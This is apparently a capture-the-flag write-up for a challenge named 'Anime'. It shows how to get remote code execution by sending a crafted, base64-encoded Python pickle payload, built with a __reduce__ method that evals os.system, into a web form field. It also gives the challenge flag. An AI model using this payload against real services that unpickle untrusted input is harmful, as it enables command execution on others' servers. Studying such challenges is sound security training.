# Anime

In this task, you need to send malicious input to "Request anime form" to trigger insecure deserialization in python pickle lib.
First of all you need to create a payload, which can lead to RCE on server. You can achive this for example with this script:

import pickle
import base64
import os

class RCE:
def **reduce**(self):
cmd = ("os.system('whoami')")
return eval, (cmd,)

if **name** == '**main**':
pickled = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(pickled))

After running this script you will be prompt with base64 output, which you need to paste in "Anime name" form field.
Run any command that can be run on linux server and you will get the flag.

> flag{d4ng3r0us_4n1m3}
